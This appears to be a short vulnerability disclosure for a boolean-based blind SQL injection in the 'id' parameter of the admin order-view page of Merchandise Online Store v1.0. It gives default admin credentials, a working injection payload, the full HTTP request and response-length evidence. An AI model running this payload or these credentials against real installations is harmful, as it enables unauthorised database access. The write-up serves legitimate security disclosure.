# Merchandise Online Store v1.0 by oretnom23 has SQL injection

Author： k0xx

The password for the backend login account is: admin/admin123

vendors: https://www.sourcecodester.com/php/14887/merchandise-online-store-php-free-source-code.html

Vulnerability File: /vloggers_merch/admin/?page=orders/view_order&id=

Vulnerability location: /vloggers_merch/admin/?page=orders/view_order&id=,id

[+] Payload: /vloggers_merch/admin/?page=orders/view_order&id=2%27%20and%20length(database())%20=17--+ // Leak place ---> id

Current database name: vloggers_merch_db,length is 17

```sql
GET /vloggers_merch/admin/?page=orders/view_order&id=2%27%20and%20length(database())%20=17--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=n23o4bgngdq5q3js6l0a0i6r6k
Connection: close
```

When length (database ()) = 16, Content-Length: 27212
![image](https://user-images.githubusercontent.com/54017627/166898817-3e249449-75b3-4940-b5fe-53a545b8dd0e.png)

![image](https://user-images.githubusercontent.com/54017627/166898708-04ea05e8-b222-441f-9f47-61db8b3c0690.png)

When length (database ()) = 17, Content-Length: 25470
![image](https://user-images.githubusercontent.com/54017627/166898766-1ec2c77a-e89d-40e5-bc03-f70381e63b13.png)

![image](https://user-images.githubusercontent.com/54017627/166898634-916268ea-1917-4af4-9775-61f8d4b84779.png)
